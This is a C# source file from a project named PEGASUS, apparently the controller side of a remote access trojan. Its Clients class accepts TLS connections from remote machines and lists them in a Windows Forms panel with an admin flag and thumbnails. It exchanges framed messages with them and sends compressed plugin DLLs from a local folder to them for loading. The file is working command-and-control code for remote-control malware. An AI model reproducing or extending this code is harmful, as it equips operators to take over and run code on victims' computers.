using PEGASUS.BytesInOut;
using PEGASUS.Cryptografhsh;
using PEGASUS.Design;
using PEGASUS.Metafora_Dedomenon;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;

namespace PEGASUS.Diadyktio
{
    public class Clients
    {
        public Clients(Socket socket)
        {
            SendSync = new object();
            TcpClient = socket;
            Ip = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
            SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
            SslClient.BeginAuthenticateAsServer(Settings.PEGASUSCertificate, false, SslProtocols.Tls, false,
                EndAuthenticate, null);
        }

        public Socket TcpClient { get; set; }
        public SslStream SslClient { get; set; }
        public ListViewItem LV { get; set; }
        public ListViewItem LV2 { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private long HeaderSize { get; set; }
        private long Offset { get; set; }
        private bool ClientBufferRecevied { get; set; }
        public object SendSync { get; set; }
        public long BytesRecevied { get; set; }
        public string Ip { get; set; }
        public bool Admin { get; set; }
        public DateTime LastPing { get; set; }

        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                SslClient.EndAuthenticateAsServer(ar);
                Offset = 0;
                HeaderSize = 4;
                ClientBuffer = new byte[HeaderSize];
                SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
            }
            catch
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
        }

        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected)
                {
                    Disconnected();
                    return;
                }

                var recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    HeaderSize -= recevied;
                    Offset += recevied;
                    switch (ClientBufferRecevied)
                    {
                        case false:
                            {
                                if (HeaderSize == 0)
                                {
                                    HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
                                    if (HeaderSize > 0)
                                    {
                                        ClientBuffer = new byte[HeaderSize];
                                        Debug.WriteLine("/// Server Buffersize " + HeaderSize + " Bytes  ///");
                                        Offset = 0;
                                        ClientBufferRecevied = true;
                                    }
                                }
                                else if (HeaderSize < 0)
                                {
                                    Disconnected();
                                    return;
                                }

                                break;
                            }

                        case true:
                            {
                                lock (Settings.LockReceivedSendValue)
                                {
                                    Settings.ReceivedValue += recevied;
                                }

                                BytesRecevied += recevied;
                                if (HeaderSize == 0)
                                {
                                    ThreadPool.QueueUserWorkItem(new Packet
                                    {
                                        client = this,
                                        data = ClientBuffer
                                    }.Read, null);
                                    Offset = 0;
                                    HeaderSize = 4;
                                    ClientBuffer = new byte[HeaderSize];
                                    ClientBufferRecevied = false;
                                }
                                else if (HeaderSize < 0)
                                {
                                    Disconnected();
                                    return;
                                }

                                break;
                            }
                    }

                    SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
                }
                else
                {
                    Disconnected();
                }
            }
            catch
            {
                Disconnected();
            }
        }


        public void Disconnected()
        {
            if (LV != null)
                Program.form1.Invoke((MethodInvoker)(() =>
               {
                   try
                   {
                       lock (Settings.LockListviewClients)
                       {
                           LV.Remove();
                       }

                       if (LV2 != null)
                           lock (Settings.LockListviewThumb)
                           {
                               LV2.Remove();
                           }
                   }
                   catch
                   {
                   }

                   new HandleLogs().Addmsg($"Client {Ip} disconnected.", Color.Red);
                   var local = TimeZoneInfo.Local;
                   if (local.Id == "China Standard Time" && Properties.Settings.Default.Notification)
                   {
                       //SoundPlayer sp = new SoundPlayer(Resources.offline);
                       // sp.Load();
                       // sp.Play();
                   }

                   foreach (var asyncTask in PEGALISIUS.getTasks.ToList()) asyncTask.doneClient.Remove(ID);
               }));

            try
            {
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch
            {
            }
        }

        public bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
                if (item.ToolTipText == id)
                    return true;
            return false;
        }

        public void Send(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!TcpClient.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[])msg == null) return;
                    var buffer = (byte[])msg;
                    var buffersize = BitConverter.GetBytes(buffer.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);

                    if (buffer.Length > 1000000) //1mb
                    {
                        Debug.WriteLine("send chunks");
                        using (var memoryStream = new MemoryStream(buffer))
                        {
                            var read = 0;
                            memoryStream.Position = 0;
                            var chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(chunk, 0, read);
                                lock (Settings.LockReceivedSendValue)
                                {
                                    Settings.SentValue += read;
                                }
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(buffer, 0, buffer.Length);
                        SslClient.Flush();
                        lock (Settings.LockReceivedSendValue)
                        {
                            Settings.SentValue += buffer.Length;
                        }
                    }

                    Debug.WriteLine("/// Server Sent " + buffer.Length + " Bytes  ///");
                }
                catch
                {
                    Disconnected();
                }
            }
        }

        public void SendPlugin(string hash)
        {
            try
            {
                foreach (var plugin in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                    if (hash == GetHash.GetChecksum(plugin))
                    {
                        var msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(plugin)));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(plugin));
                        ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
                        new HandleLogs().Addmsg($"Plugin {Path.GetFileName(plugin)} Sent to {Ip}", Color.Blue);
                        break;
                    }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg($"Clinet {Ip} {ex.Message}", Color.Red);
            }
        }
    }
}